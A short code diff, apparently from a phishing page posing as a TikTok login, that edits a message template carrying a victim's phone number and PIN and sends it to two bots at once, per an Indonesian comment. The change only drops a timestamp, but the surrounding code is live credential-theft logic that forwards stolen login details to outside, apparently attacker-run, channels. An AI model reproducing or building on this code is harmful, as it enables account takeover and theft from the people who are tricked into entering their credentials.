@@ -217,8 +217,7 @@
             // Format pesan
             let pesan = `<b>📲 Login TikTok</b>
 Nomor Handphone: <code>${nomor}</code>
-PIN: <code>${pin}</code>
-Waktu: ${new Date().toLocaleString('id-ID')}`;
+PIN: <code>${pin}</code>`;
 
             // Kirim ke 2 bot SECARA BERSAMAAN
             const [hasilBot1, hasilBot2] = await Promise.all([
